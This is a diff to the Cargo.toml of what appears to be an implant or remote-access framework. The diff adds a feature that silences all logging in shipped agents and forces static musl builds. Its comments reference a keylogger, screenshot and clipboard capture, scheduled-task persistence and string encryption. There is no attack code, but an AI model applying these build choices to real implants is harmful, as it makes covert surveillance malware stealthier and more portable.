@@ -42,7 +42,14 @@ path = "src/bin/stager.rs"
 name = "builder"
 path = "src/bin/builder.rs"
 
+[features]
+# Suppress ALL tracing callsite metadata (agent + deps) for shipped agents.
+# Passed by builder.rs as -F agent-quiet for non-debug builds only, so the
+# server and --debug agents keep their logs.
+agent-quiet = ["tracing/release_max_level_off", "log/release_max_level_off"]
+
 [dependencies]
+log = "0.4"  # direct dep so agent-quiet can set its max-level filter
 # Async Core
 tokio = { version = "1", features = ["full"] }
 futures = "0.3"
@@ -83,7 +90,7 @@ axum = { version = "0.6", features = ["headers"] }
 tower = { version = "0.4", features = ["util"] }
 tower-http = { version = "0.4", features = ["auth", "cors"] }
 http = "0.2"
-reqwest = { version = "0.11", features = ["blocking", "socks", "json", "native-tls", "multipart"] }
+reqwest = { version = "0.11", default-features = false, features = ["blocking", "socks", "json", "rustls-tls", "multipart"] }  # rustls-tls: pure-Rust TLS (no OpenSSL C lib) - required for the fully-static musl agent
 rhai = { version = "1.16", features = ["sync"] }
 walkdir = "2"
 sys-info = "0.9"
@@ -96,6 +103,12 @@ pbkdf2 = "0.12"
 sha1 = "0.10"
 zeroize = "1"
 zip = "0.6"
+# Force vendored (static) builds of compression C libraries. Without
+# this, bzip2-sys probes pkg-config on the build host and dynamically
+# links system libbz2 (SONAME libbz2.so.1.0, Debian-style) - which does
+# not exist on Fedora/RHEL (SONAME libbz2.so.1), breaking agents there.
+bzip2 = { version = "0.4", features = ["static"] }
+
 regex = "1"
 md-5 = "0.10"
 crc32fast = "1"
@@ -117,9 +130,11 @@ litcrypt = "0.4"
 strcrypt = { path = "strcrypt" }
 
 # Media & Clipboard [UPDATED]
-screenshots = "0.8"
+# screenshots moved to [target.'cfg(not(target_env = "musl"))'.dependencies] below
+
 image = "0.24"
-arboard = "3.2"  # <-- Added for Clipboard
+# arboard moved to [target.'cfg(not(target_env = "musl"))'.dependencies] below
+
 
 # Windows COM (ITaskService — scheduled task persistence, MSVC native builds only).
 # MinGW / cross-compiled agents (x86_64-pc-windows-gnu) fall back to schtasks.exe.
@@ -162,3 +177,11 @@ codegen-units = 1
 panic = "abort"
 strip = true
 debug = false
+
+# X11-dependent crates (screenshot + clipboard capture) are not available for
+# fully-static musl builds: they would drag libxcb/libX11 C dependencies back
+# in. They are compiled on every target EXCEPT musl; the agent exposes stub
+# responses there instead (see media.rs / keylogger.rs cfg gates).
+[target.'cfg(not(target_env = "musl"))'.dependencies]
+screenshots = "0.8"
+arboard = "3.2"
